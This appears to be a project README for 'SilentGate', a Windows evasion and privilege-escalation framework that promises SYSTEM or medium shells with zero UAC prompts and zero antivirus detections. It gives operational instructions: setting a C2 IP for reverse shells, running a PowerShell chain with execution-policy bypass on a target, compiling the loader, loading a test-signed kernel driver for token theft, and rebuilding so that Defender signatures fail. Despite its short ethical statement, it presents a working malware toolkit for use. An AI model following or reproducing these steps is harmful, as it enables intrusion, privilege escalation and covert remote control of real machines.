# SilentGate

> "Security is not an option. It is a need."
> — JarDani

**Advanced Windows Evasion Framework — v10.0**

---

## What Is SilentGate?

SilentGate is a research-grade Windows evasion framework built across 10 versions.
It combines mathematical obfuscation, kernel exploitation, and COM hijacking
to achieve shells with zero UAC and zero detections on Windows 10 and Windows 11.

---

## Architecture

v1-v8 Mathematical evasion layer
GF(2^8) + Lorenz chaos + Kolmogorov complexity
PEB walk API resolution
ETW patching + Poisson sleep timing

v9 Custom kernel driver
EPROCESS token manipulation
PPL removal + Kernel R/W primitives

v10 Ghost Elevation chain
Kernel token steal via IOCTL
COM LocalServer32 hijack
Zero UAC zero detections


---

## Chain Launcher

Waterfall — tries highest privilege first:

Level 0 steal_token.exe SYSTEM shell (requires driver loaded)
Level 1 Kernel IOCTL SYSTEM shell (requires driver loaded)
Level 2 COM hijack Medium shell zero UAC (universal)
Level 3 Direct shell Medium shell fallback


### Usage

```powershell
# Edit sg_chain.ps1 - set your C2 IP
$kali = "YOUR_C2_IP"

# Run on target (standard user no UAC)
powershell -ep bypass -f sg_chain.ps1
```

---

## Configuration

Edit C2 settings before compiling:

```c
#define C2_IP   0xYOURIP    // IP in network byte order
#define C2_PORT 0xYOURPORT  // Port in network byte order
// Example: 192.168.1.100:443
// C2_IP=0x6401A8C0 C2_PORT=0xBB01
```

Compile:

```bash
x86_64-w64-mingw32-gcc output/sg_loader.c \
    -o output/sg_loader.exe \
    -lws2_32 -O2 -mwindows \
    -DC2_IP=0xYOURIP -DC2_PORT=0xYOURPORT
```

---

## Results

| Target           | Shell  | UAC  | Detections |
|------------------|--------|------|------------|
| Win10 19045.6456 | SYSTEM | Zero | Zero       |
| Win11 26200.8875 | Medium | Zero | Zero       |

---

## Project Structure

core/ Mathematical evasion modules (GF/Chaos/Kolmogorov)
data/ Reference data (MITRE/EDR/Windows builds)
output/ Production binaries
sg_loader.c/.exe Main shell (zero detections)
sg_chain.c/.exe/.ps1 Unified chain launcher
sg_payload_math.c/.dll Math obfuscated payload
sg_payload_win11.c/.dll Win11 payload
v9/ Kernel driver + signing certs
tests/ Test tools
steal_token.c/.exe SYSTEM token steal via IOCTL
remove_ppl.c/.exe PPL removal
sg_driver_test.c/.exe Driver connectivity test


---

## Kernel Driver (v9)

Driver: output/v9/sg_driver_signed.sys
IOCTL: 0x00222410 (IOCTL_SG_STEAL_TOKEN)
Target: Windows 10 22H2 (EPROCESS offset 0x4B8)
Cert: output/v9/sg_test.crt (test signing)


Load (requires admin once):

```powershell
certutil -addstore TrustedPublisher output/v9/sg_test.crt
sc.exe create SilentGate binPath= "path\sg_driver_signed.sys" type= kernel start= auto
sc.exe start SilentGate
```

---

## Mathematical Evasion (v8)

Every binary uses:

```python
GF(2^8) field arithmetic     - anti-sandbox verification
Lorenz chaos attractor       - unique timing per run
Kolmogorov complexity        - entropy analysis evasion
Poisson sleep distribution   - timing fingerprint evasion
PEB walk API resolution      - no suspicious imports
ETW event write patch        - telemetry blind spot
```

---

## Quantum Pattern Mutator

Generates unique binary signature every build:

```bash
bash core/build_quantum.sh
# Every build has different MD5 hash
# Different Lorenz parameters
# Different GF polynomial
# Defender cannot build signature
```

---

## Ethical Statement

SilentGate is built for authorised penetration testing,
security research, and education only.
All testing performed in isolated lab environment.

---

## Author

JarDani

## License

MIT — Free for the security community.
